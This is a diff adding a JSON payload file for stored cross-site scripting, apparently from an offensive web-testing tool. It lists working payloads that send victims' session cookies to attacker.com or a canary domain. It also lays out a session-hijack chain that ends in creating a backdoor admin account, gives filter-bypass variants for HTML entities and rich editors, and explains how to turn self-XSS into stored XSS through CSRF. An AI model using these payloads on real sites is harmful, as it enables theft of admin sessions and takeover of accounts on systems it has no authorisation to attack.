@@ -1,0 +1,49 @@
+{
+  "type": "xss_stored",
+  "description": "Payloads for stored/persistent XSS. Focus: high-impact execution contexts (admin panels, rich editors, comment fields).",
+  "approach": [
+    "1. Inject payload in user-supplied content (comment, bio, product name, message)",
+    "2. Payload is saved to database",
+    "3. When admin/moderator views the content, payload executes in THEIR context",
+    "4. Impact: steal admin session cookie, perform admin actions, add backdoor admin account"
+  ],
+  "payloads": {
+    "basic_stored": [
+      "<script>new Image().src='https://attacker.com/c='+document.cookie</script>",
+      "<img src=x onerror=\"fetch('https://attacker.com/c?'+document.cookie)\">",
+      "<svg onload=\"document.location='https://attacker.com/c?'+document.cookie\">",
+      "<body onpageshow=this.src='https://attacker.com/c?'+document.cookie>",
+      "<iframe src=javascript:eval(atob('PAYLOAD_BASE64'))>"
+    ],
+    "admin_panel_targets": [
+      "Monitor: comment moderation queue",
+      "Monitor: user profile admin view",
+      "Monitor: support ticket system (agent view)",
+      "Monitor: audit log viewer",
+      "Monitor: report/export pages that render user data"
+    ],
+    "cookie_stealer": "<script>var i=new Image();i.src='https://CANARY_DOMAIN/?c='+btoa(document.cookie);</script>",
+    "session_hijack_chain": [
+      "Step 1: Inject payload with cookie exfiltration",
+      "Step 2: Admin views page, payload executes",
+      "Step 3: Admin cookie sent to OOB callback",
+      "Step 4: Use stolen cookie to authenticate as admin",
+      "Step 5: Create backdoor admin account or exfiltrate data"
+    ],
+    "html_entities_bypass": [
+      "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "&lt;script&gt;alert(1)&lt;/script&gt;",
+      "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
+    ],
+    "rich_editor_bypass": [
+      "<img src=x onerror=alert(1) style='display:none'>",
+      "<svg/onload=alert(1)>",
+      "<<SCRIPT>alert(1)//<</SCRIPT>",
+      "<scr<script>ipt>alert(1)</scr</script>ipt>"
+    ]
+  },
+  "impact_escalation": {
+    "from_reflected_to_stored": "If reflected XSS found, look for stored variant: does the parameter get saved anywhere (profile, preferences, log)?",
+    "from_self_xss_to_stored": "Self-XSS can be elevated via CSRF: force victim to submit XSS payload to their own account, then it's stored and visible to admins"
+  }
+}
